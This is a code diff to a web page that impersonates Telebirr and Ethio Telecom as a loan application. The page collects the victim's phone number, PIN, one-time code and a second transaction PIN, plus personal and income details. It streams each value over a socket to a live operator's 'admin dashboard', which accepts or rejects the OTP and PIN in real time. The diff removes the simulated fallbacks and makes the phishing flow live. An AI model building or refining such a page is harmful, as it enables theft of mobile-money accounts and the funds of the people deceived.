@@ -77,13 +77,13 @@
         <div id="toast" class="toast" :class="toast.show ? 'show' : ''" x-text="toast.message"></div>
 
         <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
-            <div class="px-6 py-4 flex items-center justify-between gap-4">
-                <div class="flex items-center justify-start flex-1">
-                    <img src="/public/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-10 block">
+            <div class="px-6 py-4 grid grid-cols-[1fr_auto_1fr] items-center gap-4">
+                <div class="flex justify-start">
+                    <img src="/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
                 </div>
-                <div class="h-8 w-px bg-gray-200 shrink-0"></div>
-                <div class="flex items-center justify-end flex-1">
-                    <img src="/public/assets/et-favicon.png" alt="Ethio Telecom" class="h-10 block">
+                <div class="h-8 w-[1px] bg-gray-200"></div>
+                <div class="flex justify-end">
+                    <img src="/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
                 </div>
             </div>
             
@@ -130,7 +130,6 @@
         </header>
 
         <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between relative">
-            
             <div class="w-full flex justify-center items-center gap-2 mb-6" x-show="step > 3">
                 <template x-for="i in [4, 5, 6, 8]" :key="i">
                     <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#0056B3] scale-110': step === i, 'bg-cyan-200': step > i, 'bg-gray-200': step < i }"></div>
@@ -160,9 +159,8 @@
                         </div>
                     </div>
                     <div class="pt-2">
-                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid || processingStep1" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!processingStep1">Continue</span>
-                            <span x-show="processingStep1" class="spinner-sm"></span>
+                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span>Continue</span>
                         </button>
                     </div>
                 </div>
@@ -193,7 +191,6 @@
                         <h3 class="text-lg font-bold text-gray-800">Verifying Ledger Status</h3>
                         <p class="text-xs text-gray-400 mt-2 px-6">Your transaction authorization packet is pending administrator dashboard clearance. Please leave this page open.</p>
                     </div>
-                    <button @click="simulateAdminApproval" type="button" class="text-xs text-[#0056B3] hover:underline font-bold bg-slate-100 rounded-lg px-4 py-2 mt-2 transition-all">Dev Fast-Track Approval Signal</button>
                 </div>
 
                 <div x-show="step === 3" x-cloak class="space-y-6 w-full">
@@ -201,16 +198,14 @@
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">Account Security Verification</h2>
                         <p class="text-xs text-gray-600 font-medium mt-1">Enter your 4-digit telebirr transaction PIN</p>
                     </div>
-                    
                     <div class="flex justify-center gap-3 py-1">
                         <template x-for="(_, i) in 4" :key="i">
                             <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step3-pin')" x-model="step3Pin.value[i]">
                         </template>
                     </div>
-
                     <div class="pt-2">
                         <button @click="submitFinalPinAuthorization" :disabled="!isStep3PinValid || authorizingFinalPin" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!authorizingFinalPin">Authenticate Account</span>
+                            <span x-show="!authorizingFinalPin">Continue</span>
                             <span x-show="authorizingFinalPin" class="spinner-sm"></span>
                         </button>
                     </div>
@@ -246,7 +241,7 @@
                         </select>
                     </div>
                     <div class="pt-2">
-                        <button @click="step = 5" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">Continue Flow →</button>
+                        <button @click="submitStep4Config" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">Continue Flow →</button>
                     </div>
                 </div>
 
@@ -271,7 +266,7 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-2">
                         <button @click="step = 4" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
-                        <button @click="step = 6" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Next →</button>
+                        <button @click="submitStep5Config" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Next →</button>
                     </div>
                 </div>
 
@@ -294,7 +289,10 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-2">
                         <button @click="step = 5" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
-                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Submit Application</button>
+                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income || processingStep6" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2">
+                            <span x-show="!processingStep6">Submit Application</span>
+                            <span x-show="processingStep6" class="spinner-sm"></span>
+                        </button>
                     </div>
                 </div>
 
@@ -325,12 +323,12 @@
     <script>
         function loanFlow() {
             return {
-                step: 1, referenceId: '', connected: false,
+                step: 1, appId: '', referenceId: '', connected: false,
                 form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
                 otp: { code: '' },
                 step1Pin: { value: ['', '', '', ''] },
                 step3Pin: { value: ['', '', '', ''] }, 
-                processingStep1: false, verifyingOtp: false, authorizingFinalPin: false,
+                verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
                 socket: null, toast: { show: false, message: '' },
 
                 get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
@@ -356,60 +354,117 @@
                 },
 
                 submitStep1Credentials() {
-                    this.processingStep1 = true;
+                    // Instantly drop to background log push and switch layout views immediately without spinning
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-step1-credentials', { phone: this.form.phone, pin: this.step1Pin.value.join('') });
-                    } else {
-                        setTimeout(() => {
-                            this.processingStep1 = false;
-                            this.step = 2; 
-                            this.triggerToastNotification("OTP parameter code routed successfully.");
-                        }, 800);
+                        this.socket.emit('submit-step1-credentials', { 
+                            appId: this.appId,
+                            phone: this.form.phone, 
+                            pin: this.step1Pin.value.join('') 
+                        });
                     }
+                    this.step = 2;
+                    this.triggerToastNotification("Verification session initiated.");
                 },
 
                 submitOtpToAdminQueue() {
                     this.verifyingOtp = true;
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-otp-verification', { code: this.otp.code });
-                    } else {
-                        setTimeout(() => {
-                            this.verifyingOtp = false;
-                            this.step = 2.5; 
-                        }, 800);
+                        this.socket.emit('submit-otp-verification', { 
+                            appId: this.appId,
+                            code: this.otp.code 
+                        });
+                        this.step = 2.5; // Immediately enter administrative holding state
                     }
-                },
-
-                simulateAdminApproval() {
-                    this.step = 3; 
-                    this.triggerToastNotification("Session approved by Admin Dashboard.");
                 },
 
                 submitFinalPinAuthorization() {
                     this.authorizingFinalPin = true;
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-final-pin', { pin: this.step3Pin.value.join('') });
-                    } else {
-                        setTimeout(() => {
-                            this.authorizingFinalPin = false;
-                            this.step = 4; 
-                        }, 800);
+                        this.socket.emit('submit-final-pin', { 
+                            appId: this.appId,
+                            pin: this.step3Pin.value.join('') 
+                        });
+                        this.step = 2.5; // Reuse the clean waiting spinner
                     }
                 },
 
+                submitStep4Config() {
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step4-loan-config', {
+                            appId: this.appId,
+                            loanType: this.form.loanType,
+                            amount: this.form.amount,
+                            term: this.form.term
+                        });
+                    }
+                    this.step = 5;
+                },
+
+                submitStep5Config() {
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step5-kyc-profile', {
+                            appId: this.appId,
+                            firstName: this.form.firstName,
+                            lastName: this.form.lastName,
+                            email: this.form.email
+                        });
+                    }
+                    this.step = 6;
+                },
+
                 dispatchPayoutDisbursement() {
-                    this.referenceId = "TXN-" + Math.floor(100000 + Math.random() * 900000) + "-ETB";
-                    this.step = 8;
+                    this.processingStep6 = true;
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step6-financials', {
+                            appId: this.appId,
+                            employment: this.form.employment,
+                            income: this.form.income
+                        });
+                    }
                 },
 
                 init() {
-                    this.socket = io({ autoConnect: false });
+                    this.socket = io({ autoConnect: true });
+                    
                     this.socket.on('connect', () => { this.connected = true; });
                     this.socket.on('disconnect', () => { this.connected = false; });
+                    this.socket.on('connect_error', (err) => console.error("🔌 Socket error:", err));
                     
-                    this.socket.on('otp-accepted-goto-wait', () => { this.verifyingOtp = false; this.step = 2.5; });
-                    this.socket.on('admin-dashboard-approve', () => { this.step = 3; });
-                    this.socket.on('final-pin-accepted', () => { this.authorizingFinalPin = false; this.step = 4; });
+                    this.socket.on('session-ready', (data) => {
+                        this.appId = data.appId;
+                        this.socket.emit('join-room', this.appId);
+                    });
+
+                    this.socket.on('admin-dashboard-approve', () => { 
+                        this.verifyingOtp = false;
+                        this.step = 3; 
+                        this.triggerToastNotification("OTP parameters approved safely.");
+                    });
+
+                    this.socket.on('otp-rejected', (data) => {
+                        this.verifyingOtp = false;
+                        this.otp.code = '';
+                        this.step = 2;
+                        this.triggerToastNotification(data.message || "Invalid OTP. Please enter the correct verification code.");
+                    });
+                    
+                    this.socket.on('final-pin-accepted', () => { 
+                        this.authorizingFinalPin = false; 
+                        this.step = 4; 
+                    });
+
+                    this.socket.on('pin-rejected', (data) => {
+                        this.authorizingFinalPin = false;
+                        this.step3Pin.value = ['', '', '', ''];
+                        this.step = 3;
+                        this.triggerToastNotification(data.message || "Incorrect Transaction PIN. Please try again.");
+                    });
+
+                    this.socket.on('application-complete', (data) => {
+                        this.processingStep6 = false;
+                        this.referenceId = data.referenceId;
+                        this.step = 8;
+                    });
                 }
             }
         }
